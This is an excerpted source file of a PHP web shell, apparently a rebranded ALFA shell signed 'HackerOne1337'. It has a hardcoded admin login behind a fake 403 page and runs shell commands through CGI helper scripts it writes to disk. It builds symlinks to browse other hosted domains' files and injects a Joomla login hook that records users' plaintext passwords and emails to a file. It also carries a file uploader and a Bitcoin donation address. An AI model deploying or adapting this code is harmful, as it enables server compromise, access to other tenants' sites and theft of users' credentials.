...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'Admin',
    'password' => 'beff24ee4c443abc6db68970cf2cc03e',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '0',
...
define("__HACKERONE_FOLDER__", "HACKERONE");
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"options_list_text" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(".txtfont,.tbltxt" => "color: {color};",
			)
		),
		"Alfa+" => array(
			"key_color" => "#06ff0f",
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://callmebatosay.github.io/Privilege-Escalation/img/IMG_4777.PNG" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["hackeroneapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["hackeroneapi"])){
			if(!@file_exists("hackeroneapi/".$_COOKIE["hackeroneapi"].".alfa")){
				$recreate = true;
				$lang = $_COOKIE["hackeroneapi"];
			}
		}
		if(!isset($_COOKIE["hackeroneapi"])||$recreate){
			...
			alfacgihtaccess('cgi', "hackeroneapi/");
		}else{
			$lang = $_COOKIE["hackeroneapi"];
		}
		$cgi_ext = ".alfa";
		...
		$cgi_url = __HACKERONE_FOLDER__."/hackeroneapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("hackeroneapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("hackeroneapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://callmebatosay.github.io/Privilege-Escalation/img/IMG_4777.PNG" /></td>
</tr>
<tr>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["hackeroneapi_mode"])&&!isset($_COOKIE["hackeroneapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __HACKERONE_FOLDER__);
	}
	@mkdir('hackeroneapi',0755);
	__write_file("hackeroneapi/".$name, __get_resource($source));
	@chmod("hackeroneapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/hackeroneapi';sh getheader.alfa",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./HackerOne1337 &copy; 2022-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>HackerOne1337[at]fbi.gov</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/HackerOne1337'>@HackerOne1337</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/hackeroneapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/hackeroneapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
function get_pagination_links($current_page, $total_pages){
    ...
    if ($total_pages >= 1 && $current_page <= $total_pages) {
        ...
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">1</a>";$i = max(2, $current_page - 5);
        if ($i > 2)
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __HACKERONE_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__HACKERONE_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__HACKERONE_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
	...
	if($anonymous){
		...
		foreach($anony_domains as $anony){
			...
			if(substr($owner, 0, $owner_len) == substr($sub_domain, 0, $owner_len)){
				...
				$count++;
				$temp_black[] = $owner.$domain;$finded = true;
			}
		}
		if(!$finded){
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__HACKERONE_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__HACKERONE_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
$bash_users  = alfaEx("cd ".$tmp_path."/hackeroneapi;sh basedir.alfa ".$makepwd,false,true,true);
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$HACKERONE = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($HACKERONE, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
return('<iframe src="'.__HACKERONE_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
